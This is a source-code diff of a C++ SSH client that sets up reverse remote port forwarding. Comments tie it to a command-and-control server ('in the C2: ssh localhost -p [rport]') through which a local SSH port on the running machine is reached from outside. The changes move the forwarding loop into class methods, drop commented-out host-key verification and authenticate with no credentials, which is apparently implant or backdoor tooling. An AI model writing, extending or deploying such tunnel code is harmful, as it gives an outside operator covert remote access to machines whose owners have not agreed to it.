@@ -2,7 +2,9 @@
 
 #include <libssh/libssh.h>
 #include <libssh/server.h>
+
 #include <stdio.h>
+#include <thread>
 
 #include "client.h"
 
@@ -19,11 +21,13 @@
 #define debug(MESSAGE, ...)
 #endif
 
+int SSHClient::should_terminate = 0;
+
 SSHClient::SSHClient()
 {
 }
 
-static int connect_to_local_service(int port)
+int SSHClient::connect_to_local_service(int port)
 {
     int sockfd = 0;
 
@@ -50,15 +54,9 @@ static int connect_to_local_service(int port)
     return sockfd;
 }
 
-#define CLIENT_SENT_EOF -6
-#define SERVICE_SENT_EOF -5
-#define SERVICE_CONN_ERROR -4
-#define SSH_SENT_EOF -3
-#define SYSTEM_ERROR -2
 
-int should_terminate = 0;
 
-static int do_remote_forwarding_loop(ssh_session session,
+int SSHClient::do_remote_forwarding_loop(ssh_session session,
     ssh_channel channel, int lport)
 {
     /* Connect to the service */
@@ -227,34 +225,64 @@ static int do_remote_forwarding_loop(ssh_session session,
     return SSH_OK;
 }
 
+void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int lport) {
+	auto rc = do_remote_forwarding_loop(sess, chan, lport);
+	if (rc == SSH_SENT_EOF || rc == SSH_ERROR || rc == SYSTEM_ERROR) {
+		debug("[OTCP] Terminate SSH channel\n");
+		ssh_channel_send_eof(chan);
+		ssh_channel_free(chan);
+		/*ssh_disconnect(sess);
+		ssh_free(sess);*/
+		return ;
+	}
+	else {
+		/* The service has either sent EOF
+		   or an error condition occurred, but
+		   the tunnel is still open.
+		   Accept a new connection. */
+		debug("[DEBUG] Service disconnected\n");
+		ssh_channel_send_eof(chan);
+		debug("[DEBUG] Sent SSH EOF\n");
+		ssh_channel_free(chan);
+		debug("[DEBUG] Freed channel\n");
+		return;
+	}
+}
+
+
 /* OpenSSH command equivalent:
  * ssh <ssh-server> -p <ssh-server-port> -R <rport>:<laddress>:<lport>
  *
  * lport:   port to forward to once tunnel established  // usually 22 for us 2222
  * rport:   port the ssh server will be listening on    // we will do in the C2: ssh localhost -p [rport]
  */
-int do_remote_forwarding(ssh_session sess, int lport, int rport)
+int SSHClient::do_remote_forwarding(ssh_session sess, int lport, int rport)
 {
     debug("[OTCP] Opening port T:%d on server...\n", lport);
-    int bounded_port;
+    int bounded_port = 0;
     int nbytes, nwritten;
     char buffer[256];
-    auto rc = ssh_channel_listen_forward(sess, "127.0.0.1", NULL, &bounded_port);
+#ifdef IS_DEBUG
+	int remote_liste_port = 1234;
+#else
+	int remote_liste_port = NULL;
+#endif
+    auto rc = ssh_channel_listen_forward(sess, "127.0.0.1", remote_liste_port, &bounded_port);
     if (rc != SSH_OK) {
         debug("failed: %s\n", ssh_get_error(sess));
         ssh_disconnect(sess);
         ssh_free(sess);
         return -1;
     }
-    debug("Check port %d in remote server\n", bounded_port);
+    debug("Check port %d in remote server\n", bounded_port?bounded_port:remote_liste_port);
 
+	ssh_channel chan;
     while (!should_terminate) {
         int dport = 0;	// The port bound on the server, here: 8080
         debug("[OTCP] Waiting for incoming connection...");
         fflush(stdout);
 
-#define ACCEPT_FORWARD_TIMEOUT 15000	// ms
-        ssh_channel chan = ssh_channel_accept_forward(sess,
+        chan = ssh_channel_accept_forward(sess,
             ACCEPT_FORWARD_TIMEOUT,
             &dport);
         if (chan == NULL) {
@@ -270,28 +298,9 @@ int do_remote_forwarding(ssh_session sess, int lport, int rport)
             }
         }
         debug("\n[OTCP] Connection received\n");
-
-        rc = do_remote_forwarding_loop(sess, chan, lport);
-        if (rc == SSH_SENT_EOF || rc == SSH_ERROR || rc == SYSTEM_ERROR) {
-            debug("[OTCP] Terminate SSH channel\n");
-            ssh_channel_send_eof(chan);
-            ssh_channel_free(chan);
-            ssh_disconnect(sess);
-            ssh_free(sess);
-            return 1;
-        }
-        else {
-            /* The service has either sent EOF
-               or an error condition occurred, but
-               the tunnel is still open.
-               Accept a new connection. */
-            debug("[DEBUG] Service disconnected\n");
-            ssh_channel_send_eof(chan);
-            debug("[DEBUG] Sent SSH EOF\n");
-            ssh_channel_free(chan);
-            debug("[DEBUG] Freed channel\n");
-            continue;
-        }
+		//std::thread(SSHClient::remote_forwading_thread, sess, chan, lport).detach();
+		SSHClient::remote_forwading_thread(sess, chan, lport);
+        
     }
 
     ssh_disconnect(sess);
@@ -304,7 +313,7 @@ int SSHClient::run(const char* username, const char* host, int port)
 {
     ssh_session my_ssh_session;
 #ifdef IS_DEBUG
-    int verbosity = SSH_LOG_PROTOCOL;
+    int verbosity = SSH_LOG_FUNCTIONS;
 #else
     int verbosity = SSH_LOG_NOLOG;
 #endif // DEBUG
@@ -331,16 +340,7 @@ int SSHClient::run(const char* username, const char* host, int port)
         ssh_free(my_ssh_session);
         exit(-1);
     }
-    // Verify the server's identity
-    // For the source code of verify_knownhost(), check previous example
-    /*if (verify_knownhost(my_ssh_session) < 0)
-    {
-        ssh_disconnect(my_ssh_session);
-        ssh_free(my_ssh_session);
-        exit(-1);
-    }*/
-    // Authenticate ourselves
-    //rc = ssh_userauth_password(my_ssh_session, username, password);
+
     rc = ssh_userauth_none(my_ssh_session, username);
     if (rc != SSH_AUTH_SUCCESS)
     {
@@ -357,6 +357,8 @@ int SSHClient::run(const char* username, const char* host, int port)
 
     ssh_disconnect(my_ssh_session);
     ssh_free(my_ssh_session);
-    ssh_finalize();
+    
+
+
     return 0;
 }
